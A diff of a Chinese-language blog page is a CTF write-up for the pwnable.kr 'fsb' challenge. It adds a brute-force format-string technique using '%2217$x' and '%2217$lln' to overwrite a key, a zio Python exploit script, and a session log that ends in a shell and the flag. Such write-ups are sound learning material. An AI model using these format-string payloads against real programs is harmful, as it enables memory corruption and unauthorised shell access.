@@ -87,24 +87,24 @@
 <meta name="description" content="Trick
 利用fsb的%_$n时，如果栈上的空间不是直接可控的，可以试着在栈上寻找是否有栈地址存放在上面，如果找到了，可以利用%_$n写入，这样相当于在栈上实现arbitrary write，之后就按正常的套路即可
 
-Exploit没有想出来，参考了一些网上的exp，总结了一下自己没有想到的原因：没有思考如何控制栈上的空间，只是单纯的认为可控区域只在.bss段。
+Conclusion没有想出来，参考了一些网上的exp，总结了一下自己没有想到的原因：没有思考如何控制栈上的空间，只是单纯的认为可控区域只在.bss段
 等过段时间回来再写一次exp">
 <meta property="og:type" content="article">
 <meta property="og:title" content="pwnable.kr-rookiss-fsb">
-<meta property="og:url" content="http://0byjwzsf.me/2016/07/26/pwnable-rookiss-fsb/index.html">
+<meta property="og:url" content="http://0byjwzsf.me/2016/08/09/pwnable-rookiss-fsb/index.html">
 <meta property="og:site_name" content="Icemakr's Blog">
 <meta property="og:description" content="Trick
 利用fsb的%_$n时，如果栈上的空间不是直接可控的，可以试着在栈上寻找是否有栈地址存放在上面，如果找到了，可以利用%_$n写入，这样相当于在栈上实现arbitrary write，之后就按正常的套路即可
 
-Exploit没有想出来，参考了一些网上的exp，总结了一下自己没有想到的原因：没有思考如何控制栈上的空间，只是单纯的认为可控区域只在.bss段。
+Conclusion没有想出来，参考了一些网上的exp，总结了一下自己没有想到的原因：没有思考如何控制栈上的空间，只是单纯的认为可控区域只在.bss段
 等过段时间回来再写一次exp">
-<meta property="og:updated_time" content="2016-08-08T08:08:12.000Z">
+<meta property="og:updated_time" content="2016-08-09T07:39:33.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="pwnable.kr-rookiss-fsb">
 <meta name="twitter:description" content="Trick
 利用fsb的%_$n时，如果栈上的空间不是直接可控的，可以试着在栈上寻找是否有栈地址存放在上面，如果找到了，可以利用%_$n写入，这样相当于在栈上实现arbitrary write，之后就按正常的套路即可
 
-Exploit没有想出来，参考了一些网上的exp，总结了一下自己没有想到的原因：没有思考如何控制栈上的空间，只是单纯的认为可控区域只在.bss段。
+Conclusion没有想出来，参考了一些网上的exp，总结了一下自己没有想到的原因：没有思考如何控制栈上的空间，只是单纯的认为可控区域只在.bss段
 等过段时间回来再写一次exp">
 
 
@@ -126,7 +126,7 @@ Exploit没有想出来，参考了一些网上的exp，总结了一下自己没�
 
 
 
-  <link rel="canonical" href="http://0byjwzsf.me/2016/07/26/pwnable-rookiss-fsb/"/>
+  <link rel="canonical" href="http://0byjwzsf.me/2016/08/09/pwnable-rookiss-fsb/"/>
 
   <title> pwnable.kr-rookiss-fsb | Icemakr's Blog </title>
 </head>
@@ -310,8 +310,8 @@ Exploit没有想出来，参考了一些网上的exp，总结了一下自己没�
               <i class="fa fa-calendar-o"></i>
             </span>
             <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-07-26T00:00:00+08:00" content="2016-07-26">
-              2016-07-26
+            <time itemprop="dateCreated" datetime="2016-08-09T00:00:00+08:00" content="2016-08-09">
+              2016-08-09
             </time>
           </span>
 
@@ -340,8 +340,8 @@ Exploit没有想出来，参考了一些网上的exp，总结了一下自己没�
             
               <span class="post-comments-count">
                 &nbsp; | &nbsp;
-                <a href="/2016/07/26/pwnable-rookiss-fsb/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/07/26/pwnable-rookiss-fsb/" itemprop="commentsCount"></span>
+                <a href="/2016/08/09/pwnable-rookiss-fsb/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/08/09/pwnable-rookiss-fsb/" itemprop="commentsCount"></span>
                 </a>
               </span>
             
@@ -365,10 +365,19 @@ Exploit没有想出来，参考了一些网上的exp，总结了一下自己没�
 
       
         <h2 id="Trick">Trick</h2><ul>
-<li>利用fsb的<code>%_$n</code>时，如果栈上的空间不是直接可控的，可以试着在栈上寻找是否有栈地址存放在上面，如果找到了，可以利用<code>%_$n</code>写入，这样相当于在栈上实现<code>arbitrary write</code>，之后就按正常的套路即可</li>
+<li><del>利用fsb的<code>%_$n</code>时，如果栈上的空间不是直接可控的，可以试着在栈上寻找是否有栈地址存放在上面，如果找到了，可以利用<code>%_$n</code>写入，这样相当于在栈上实现<code>arbitrary write</code>，之后就按正常的套路即可</del></li>
 </ul>
-<h2 id="Exploit">Exploit</h2><p>没有想出来，参考了一些网上的exp，总结了一下自己没有想到的原因：没有思考如何控制栈上的空间，只是单纯的认为可控区域只在.bss段。</p>
-<p>等过段时间回来再写一次exp</p>
+<h2 id="Conclusion">Conclusion</h2><p><del>没有想出来，参考了一些网上的exp，总结了一下自己没有想到的原因：没有思考如何控制栈上的空间，只是单纯的认为可控区域只在.bss段</del></p>
+<p><del>等过段时间回来再写一次exp</del></p>
+<p>今天又重新试了一下，发现之前看的那种方法也不太合适，因为要打印太多字符，后来又想了下，可以在栈上找<strong>key</strong>的地址，然后覆盖key即可绕过，因为服务器开了<strong>aslr</strong>，所以可以用暴力的方法去找key的地址</p>
+<p>不断用<code>%2217$x</code>即可，直到打印出<code>0x8048060</code></p>
+<p>到了写入的阶段，没有想到如何一次写两个字，在网上找了一些资料后发了了可以用<code>%lln</code></p>
+<p>因此在碰撞出来之后，再用<code>%2217$lln</code>写入即可覆盖<strong>key</strong></p>
+<h2 id="Exploit">Exploit</h2><p>这个exp只能在本地运行，服务器上没有zio。pwntools的版本也是写过一个，但是因为程序没有用setbuf来取消标准IO的缓冲，所以读写一直搞不定，干脆就直接ssh到服务器上手输payload了。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line">target  = <span class="string">'./fsb'</span></span><br><span class="line"></span><br><span class="line">adr_buf     = <span class="number">0x804a100</span></span><br><span class="line">adr_buf2    = <span class="number">0x804a080</span></span><br><span class="line">adr_key     = <span class="number">0x804a060</span></span><br><span class="line">adr_execve  = <span class="number">0x80486ab</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(target)</span>:</span></span><br><span class="line">    io = zio(<span class="string">'./fsb'</span>, print_read = <span class="keyword">False</span>, print_write = <span class="keyword">False</span>)</span><br><span class="line">    io.read_until(<span class="string">'(1)'</span>)</span><br><span class="line">    io.writeline(<span class="string">'%2217$x'</span>)</span><br><span class="line">    leak = <span class="number">0</span></span><br><span class="line">    <span class="keyword">try</span> :</span><br><span class="line">        io.read_line()</span><br><span class="line">        leak = int(io.read_until(<span class="string">'\n'</span>)[<span class="number">0</span>:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">except</span> :</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">print</span> hex(leak)</span><br><span class="line">    <span class="keyword">if</span> leak != <span class="number">0x804a060</span>:</span><br><span class="line">        io.close()</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'\n[+] find address of key'</span></span><br><span class="line">        io.read_until(<span class="string">'(2)'</span>)</span><br><span class="line">        io.writeline(<span class="string">'%2217$lln'</span>)</span><br><span class="line">        io.read_until(<span class="string">'(3)'</span>)</span><br><span class="line">        io.writeline(<span class="string">'0'</span>)</span><br><span class="line">        io.read_until(<span class="string">'(4)'</span>)</span><br><span class="line">        io.writeline(<span class="string">'0'</span>)</span><br><span class="line">        io.read_until(<span class="string">'key :'</span>)</span><br><span class="line">        io.writeline(<span class="string">'0'</span>)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[+] your shell !'</span></span><br><span class="line">        io.interact()</span><br><span class="line">        io.close()</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[-] please wait'</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    exp(target)</span><br></pre></td></tr></table></figure>
+<p>log</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">icemakr:~$ ssh fsb@pwnable.kr -p2222&#10;fsb@pwnable.kr&#39;s password:&#10; ____  __    __  ____    ____  ____   _        ___      __  _  ____&#10;|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \&#10;|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  &#39; / |  D  )&#10;|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    /&#10;|  |  |  `  &#39;  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \&#10;|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \&#10;|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|&#10;&#10;- Site admin : daehee87.kr@gmail.com&#10;- IRC : irc.smashthestack.org:6667 / #pwnable.kr&#10;- Simply type &#34;irssi&#34; command to join IRC now&#10;- files under /tmp can be erased anytime. make your directory under /tmp&#10;- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal&#10;Last login: Mon Aug  8 22:40:40 2016 from 211.36.139.90&#10;fsb@ubuntu:~$ ls&#10;flag  fsb  fsb.c&#10;fsb@ubuntu:~$ ./fsb&#10;Give me some format strings(1)&#10;%2217$x&#10;0&#10;Give me some format strings(2)&#10;^C&#10;fsb@ubuntu:~$ ./fsb&#10;Give me some format strings(1)&#10;%2217$x&#10;Segmentation fault&#10;fsb@ubuntu:~$ ./fsb&#10;Give me some format strings(1)&#10;%2217$x&#10;0&#10;Give me some format strings(2)&#10;^C&#10;fsb@ubuntu:~$ ./fsb&#10;Give me some format strings(1)&#10;%2217$x&#10;804a060&#10;Give me some format strings(2)&#10;%2217$lln&#10;&#10;Give me some format strings(3)&#10;32&#10;32&#10;17$lln&#10;Give me some format strings(4)&#10;2&#10;2&#10;&#10;17$lln&#10;Wait a sec...&#10;key :&#10;0&#10;Congratz!&#10;$ ls&#10;flag  fsb  fsb.c&#10;$ cat flag&#10;Have you ever saw an example of utilizing [n] format character?? :(&#10;$ exit</span><br></pre></td></tr></table></figure>
+<h2 id="Referance">Referance</h2><p><a href="https://gist.github.com/ihciah/2b164e86fa9dd2f267d7" target="_blank" rel="external">https://gist.github.com/ihciah/2b164e86fa9dd2f267d7</a></p>
 
       
     </div>
@@ -400,17 +409,13 @@ Exploit没有想出来，参考了一些网上的exp，总结了一下自己没�
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2016/07/25/pwnable-rookiss-echo2/" rel="next" title="pwnable.kr-rookiss-echo2">
-                <i class="fa fa-chevron-left"></i> pwnable.kr-rookiss-echo2
+              <a href="/2016/08/08/pwnable-rookiss-alloca/" rel="next" title="pwnable.kr-rookiss-alloca">
+                <i class="fa fa-chevron-left"></i> pwnable.kr-rookiss-alloca
               </a>
             
           </div>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2016/07/26/pwnable-rookiss-simple-login/" rel="prev" title="pwnable.kr-rookiss-simple-login">
-                pwnable.kr-rookiss-simple-login <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -542,7 +547,7 @@ Exploit没有想出来，参考了一些网上的exp，总结了一下自己没�
               
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Trick"><span class="nav-number">1.</span> <span class="nav-text">Trick</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit"><span class="nav-number">2.</span> <span class="nav-text">Exploit</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Trick"><span class="nav-number">1.</span> <span class="nav-text">Trick</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Conclusion"><span class="nav-number">2.</span> <span class="nav-text">Conclusion</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit"><span class="nav-number">3.</span> <span class="nav-text">Exploit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Referance"><span class="nav-number">4.</span> <span class="nav-text">Referance</span></a></li></ol></div>
             
           </div>
         </section>
@@ -669,9 +674,9 @@ Exploit没有想出来，参考了一些网上的exp，总结了一下自己没�
 
     <script type="text/javascript">
       var disqus_shortname = '0byjwzsf';
-      var disqus_identifier = '2016/07/26/pwnable-rookiss-fsb/';
+      var disqus_identifier = '2016/08/09/pwnable-rookiss-fsb/';
       var disqus_title = "pwnable.kr-rookiss-fsb";
-      var disqus_url = 'http://0byjwzsf.me/2016/07/26/pwnable-rookiss-fsb/';
+      var disqus_url = 'http://0byjwzsf.me/2016/08/09/pwnable-rookiss-fsb/';
 
       function run_disqus_script(disqus_script){
         var dsq = document.createElement('script');
